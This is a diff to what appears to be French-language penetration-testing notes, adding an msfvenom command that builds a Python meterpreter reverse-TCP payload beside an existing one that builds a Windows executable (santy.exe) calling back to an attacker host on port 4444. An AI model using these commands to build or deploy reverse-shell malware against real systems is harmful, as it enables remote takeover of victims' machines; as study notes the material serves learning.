@@ -574,6 +574,7 @@ attacker <-> [port 4444] <-> victim -
 Creer malware avec metasploit (etre en root):
 ```
 msfvenom –p windows/meterpreter_reverse_tcp –f exe –a x86 –platform windows  LHOST 192.168.174.192 LPORT 4444 –o santy.exe
+msfvenom --payload python/meterpreter/reverse_tcp LHOST=... LPORT=4444 > rev_tcp_4444.py
 ## attention ordre arguments important
 #-p prépare le payload.
 #-f exe indique que le type de fichier, ou l’extension de fichier sera exe (windows)
